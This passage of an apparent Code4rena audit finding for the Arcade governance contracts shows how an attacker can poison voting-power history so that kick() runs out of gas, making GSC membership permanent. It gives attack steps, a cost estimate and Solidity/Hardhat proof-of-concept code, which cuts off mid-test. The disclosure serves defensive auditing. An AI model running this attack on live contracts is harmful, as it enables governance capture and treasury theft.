href=\"https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/external/council/libraries/History.sol#L198-L199\">https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/external/council/libraries/History.sol#L198-L199</a><br><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/ArcadeGSCVault.sol#L25\">https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/ArcadeGSCVault.sol#L25</a></p>\n<h3 id=\"vulnerability-details\" style=\"position:relative;\"><a href=\"#vulnerability-details\" aria-label=\"vulnerability details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability details</h3>\n<p><em>Note: Some of the contracts mentioned are out of scope, but the vulnerability exists in the <code>BaseVotingVault</code>, which is in scope, so I argue that the finding is in scope.</em></p>\n<p>In the Arcade ecosystem, there is a GSC group which has some extra privileges, like spending some token amount from the treasury or creating new proposals in the core voting contract.</p>\n<p>In order to become a member of this group, a user has to have a high enough voting power (combined from several voting vaults) and call <code>proveMembership</code>. When user’s voting power drops beneath a certain threshold, they may be kicked out of the GSC.</p>\n<p><code>proveMembership</code> contains the following code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">votingVaults</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Call the vault to check last block&#39;s voting power</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Last block to ensure there&#39;s no flash loan or other</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// intra contract interaction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votes</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">IVotingVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votingVaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">queryVotePower</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">extraData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Add up the votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">totalVotes</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">votes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<p>So, it basically iterates over all voting vaults that a user specifies, sums up their voting power, and if it’s enough, it grants that user a place in GSC.</p>\n<p>In order to kick a user out from the GSC, the <code>kick</code> function may be used and it will iterate over all vaults that were supplied by a user when they call <code>proveMembership</code> and if their voting power drops beneath the threshold, they will be removed from the GSC. <code>kick</code> contains the following code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">votingVaults</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// If the vault is not approved we don&#39;t count its votes now</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">coreVoting</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approvedVaults</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votingVaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">])) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// Call the vault to check last block&#39;s voting power</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// Last block to ensure there&#39;s no flash loan or other</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// intra contract interaction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votes</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">IVotingVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votingVaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">queryVotePower</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        </span><span class=\"mtk12\">who</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        </span><span class=\"mtk12\">extraData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// Add up the votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">totalVotes</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">votes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<p>As we see, <code>queryVotePower</code> will be called again on each vault. Let’s see how <code>queryVotePower</code> is implemented in <code>BaseVotingVault</code>, which is used as a base contract for some voting contracts:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">queryVotePower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blockNumber</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get our reference to historical data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">History</span><span class=\"mtk1\">.</span><span class=\"mtk12\">HistoricalBalances</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_votingPower</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Find the historical data and clear everything more than &#39;staleBlockLag&#39; into the past</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">.</span><span class=\"mtk11\">findAndClear</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">blockNumber</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">staleBlockLag</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>As we see, it will always call the <code>findAndClear</code> function that will return the most recent voting power and will attempt to erase some older entries. New entries are added for a user when their voting power changes and no more than <code>1</code> entry is added to each block (if several changes happen in one block, values are just updated).</p>\n<p>Now, the attacker (Bob) may perform the following attack:</p>\n<ol>\n<li>Bob acquires enough votes to become a GSC member (they can either just buy enough tokens or deploy a smart contract that will offer a high yield for users who stake their vault tokens there).</li>\n<li>Bob calls <code>proveMembership</code> and specifies <code>NFTBoostVault</code> as a proof. They will be accepted.</li>\n<li>Bob “poisons” their voting power history by delegating from and redelegating to themself some dust token amount in several thousand different blocks (possible to do in less than <code>12h</code> on Ethereum).</li>\n<li>Bob withdraws all their tokens from <code>NFTBoostVault</code>.</li>\n<li>Alice spots that Bob doesn’t have enough voting power anymore and will attempt to kick them, but since <code>findAndClear</code> will try to erase several thousand entries, it will exceed the Ethereum block limit for gas and the transaction will revert with Out Of Gas exception (<code>kick</code> will iterate over all vaults supplied by Bob, so Alice is forced to call <code>queryVotePower</code> on the vault that Bob used for the attack).</li>\n<li>Bob can now send tokens to their other account, repeat the attack and they can do this until they have <code>>50%</code> in the GSC.</li>\n</ol>\n<p>A similar exploit was presented by myself in a different submission, but this one is different; since the previous one focuses on a different aspect of that DoS attack - changing voting outcome. Here, I’m showing how somebody can permanently become a GSC member.</p>\n<p>As reported in that different submission, the cost of performing the attack once is <code>~14ETH</code>, so it’s not that much (currently <code>14ETH = $1880 * 14 = $26320</code>), but it may be worth it to perform this attack in order to be able to get <code>>50%</code> of GSC.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>An attacker is able to become a permanent GSC member, even if they don’t stake any tokens; which shouldn’t be allowed and already has a huge impact on the protocol.</p>\n<p>Even worse, they may try to acquire <code>> 50%</code> of voting power (GSC shouldn’t have too many members - probably about <code>10</code> or something like this). Still, the GSC owner has <code>100,000</code> votes, but it is a time-lock contract, so might not be able to react fast enough to veto malicious proposals. Even if it is, this attack will destroy the entire GSC (since, from now on, the owner will decide about everything making GSC members useless), which is an important concept in the Arcade protocol.</p>\n<p>Hence, the impact is huge (and assets can be lost since GSC is able to spend some tokens from the treasury) and there aren’t any external factors allowed. So, I’m submitting this issue as High.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Several modifications are necessary in order to run the test. They are only introduced to make testing easier and don’t have anything in common with the attack itself. First of all, please change <code>Authorizable::setOwner</code> as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">who</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk3\">/*onlyOwner()*/</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>Then, please change <code>NFTBoostVault</code> so that withdrawals are possible:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">staleBlockLag</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timelock</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">manager</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">BaseVotingVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">staleBlockLag</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">timelock</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NBV_ZeroAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;timelock&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">manager</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NBV_ZeroAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;manager&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">set</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uint256Ptr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;initialized&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">set</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addressPtr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;timelock&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">timelock</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">set</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addressPtr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;manager&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">set</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uint256Ptr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;entered&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">set</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uint256Ptr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;locked&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// line changed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Then, please add a basic <code>ERC20</code> token implementation to a <code>TestERC20.sol</code> file in the <code>contracts/test</code> directory (it’s only used to mint some tokens to the users):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TestERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;TestERC20&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;TERC20&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Finally, please put the following test inside <code>ArcadeGscVault.ts</code> (<code>import { mine } from \"@nomicfoundation/hardhat-network-helpers\";</code> will have to be also inserted there):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">describe(&quot;Unkickable from GSC vault&quot;, async () =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        it(&quot;Unkickable from GSC vault&quot;, async () =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            const { coreVoting, arcadeGSCVault } = ctxGovernance;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            const signers = await ethers.getSigners();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            const owner = signers[0];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            const Alice = signers[1];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            const Bob = signers[2];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // balance of each user in TestERC20 custom token</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            const ALICES_BALANCE = ethers.utils.parseEther(&quot;1000000000&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            const BOBS_BALANCE = ethers.utils.parseEther(&quot;100&quot;); // enough to join GSC</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            const TestERC20Factory = await ethers.getContractFactory(&quot;TestERC20&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            const TestERC20 = await TestERC20Factory.deploy();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // mine some block in the future to resemble mainnet state</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await mine(1_000_000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // deploy NFTBoostVault with custom token (TestERC20) - we only need this token to provide some</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // balance to users so that they can stake their tokens in the vault</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            const NFTBoostVaultFactory = await ethers.getContractFactory(&quot;NFTBoostVault&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            const NFTBoostVault = await NFTBoostVaultFactory.deploy(TestERC20.address, 10, owner.address, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // set owner just to be able to call `changeVaultStatus`, so that testing is easier</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await coreVoting.connect(owner).setOwner(owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await coreVoting.connect(owner).changeVaultStatus(NFTBoostVault.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // mint TestERC20 to users so that they can stake them</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await TestERC20.connect(Alice).mint(Alice.address, ALICES_BALANCE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await TestERC20.connect(Bob).mint(Bob.address, BOBS_BALANCE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // everyone approves TestERC20, so that they can stake</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await TestERC20.connect(Alice).approve(NFTBoostVault.address, ALICES_BALANCE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await TestERC20.connect(Bob).approve(NFTBoostVault.address, BOBS_BALANCE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Alice and Bob add some tokens and delegate</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await 